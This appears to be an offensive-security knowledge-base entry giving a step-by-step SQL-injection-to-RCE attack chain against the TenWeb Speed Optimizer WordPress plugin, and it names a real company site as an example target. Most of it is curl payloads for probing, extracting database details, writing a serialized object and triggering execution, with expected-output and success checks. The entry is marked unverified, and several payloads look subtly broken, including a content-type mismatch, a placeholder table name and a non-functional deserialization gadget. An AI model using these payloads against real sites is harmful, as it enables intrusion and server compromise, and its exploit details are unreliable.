---
tags:
  - sqli
  - rce
  - wordpress
  - deserialization
  - php
type: attack_chain
tools: []
tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
verified: false
platforms:
  - Web
  - WordPress
submitted: true
complexity: medium
created_at: '2023-10-01T00:00:00Z'
procedures:
  - '[[procedures/Exploit-SQL-Injection-in-TenWeb-API-Endpoint]]'
  - '[[procedures/Chain-SQLi-with-Insecure-Deserialization-for-RCE]]'
step_count: 2
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Exploitation for Client Execution]]'
updated_at: '2025-12-14T03:15:09.877Z'
description: >-
  A multi-stage attack exploiting unauthenticated SQL injection in the TenWeb
  Speed Optimizer WordPress plugin, chained with insecure deserialization to
  achieve remote code execution on the target WordPress site.
skill_level: intermediate
impact_level: high
id: 01a008b7-ae40-4624-8f46-3c7f4768f1c6
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Exploitation for Client Execution]]'
---
---

# SQL Injection Chained with Insecure Deserialization for RCE in TenWeb Speed Optimizer Plugin

Multi-stage attack chain demonstrating a complete attack workflow exploiting vulnerabilities in the TenWeb Speed Optimizer WordPress plugin (versions prior to 2.12.22) to achieve full server compromise on a target site like https://krisp.ai.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 2 |
| Execution Time | ~10 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Initial Access via SQLi] --> B[Data Manipulation]
    B --> C[RCE via Deserialization]
    C --> D[Server Compromise]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#3498db
    style D fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- [[tools/sqlmap]]
- [[tools/curl]]

### Target Environment

- WordPress site with TenWeb Speed Optimizer plugin (version < 2.12.22)
- Exposed API endpoint /wp-json/tenwebio/v2/compress-one
- MySQL backend database
- PHP runtime

### Initial Access Requirements

- Network access to the target WordPress site
- No authentication required (unauthenticated endpoint)
- Prior reconnaissance to confirm plugin presence

## Detailed Attack Procedures

### Step 1: Exploit SQL Injection
procedure: [[procedures/Exploit-SQL-Injection-in-TenWeb-API-Endpoint]]

**Objective**: Identify and exploit unauthenticated SQL injection in the plugin's API endpoint to execute arbitrary database queries, enabling data extraction or manipulation.

**Instructions**: Begin by testing the /wp-json/tenwebio/v2/compress-one endpoint for SQL injection vulnerabilities using [[commands/test-sqli-payload]] to send a crafted payload:

```bash
curl -X POST 'https://target.com/wp-json/tenwebio/v2/compress-one' -d 'param=\' AND 1=1 --' -H 'Content-Type: application/json'
```

If successful, escalate to extract database information with [[commands/extract-db-info]]:

```bash
curl -X POST 'https://target.com/wp-json/tenwebio/v2/compress-one' -d 'param=\' UNION SELECT database(),user(),version() --' -H 'Content-Type: application/json'
```

**Expected Output**: Database schema details or error messages confirming injection success, such as MySQL version or table names.

**Success Indicators**:
- Response includes database information
- No authentication errors
- Payload alters query behavior

### Step 2: Chain with Insecure Deserialization for RCE
procedure: [[procedures/Chain-SQLi-with-Insecure-Deserialization-for-RCE]]

**Objective**: Use the SQL injection to manipulate serialized data in the database, triggering insecure deserialization in the plugin to execute arbitrary PHP code on the server.

**Instructions**: Leverage the SQLi from Step 1 to inject a malicious serialized payload into a vulnerable database field using [[commands/inject-serialized-payload]]:

```bash
curl -X POST 'https://target.com/wp-json/tenwebio/v2/compress-one' -d 'param=\' ; UPDATE table SET serialized_data=\'O:8:"stdClass":1:{s:4:"exec";s:14:"system(\"id\")";}\' --' -H 'Content-Type: application/json'
```

Trigger the deserialization by accessing a plugin function that processes the manipulated data, such as resubmitting a compression request with [[commands/trigger-deserialization]]:

```bash
curl -X POST 'https://target.com/wp-json/tenwebio/v2/compress-one' -d 'param=trigger' -H 'Content-Type: application/json'
```

**Expected Output**: Server executes the payload, e.g., output from 'id' command in response or logs indicating code execution.

**Success Indicators**:
- Arbitrary code runs on server
- Response includes command output
- Access to system files or shell

## Attack Chain Summary

### Key Achievements

1. Unauthenticated access to database via SQLi
2. Manipulation of serialized objects leading to RCE
3. Full compromise of the WordPress server

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Exploit Public-Facing Application]]
- [[Exploitation for Client Execution]]

### MITRE ATT&CK Tactics

- [[Initial Access]]
- [[Execution]]

---

*Last updated: 2023-10-01T00:00:00Z*
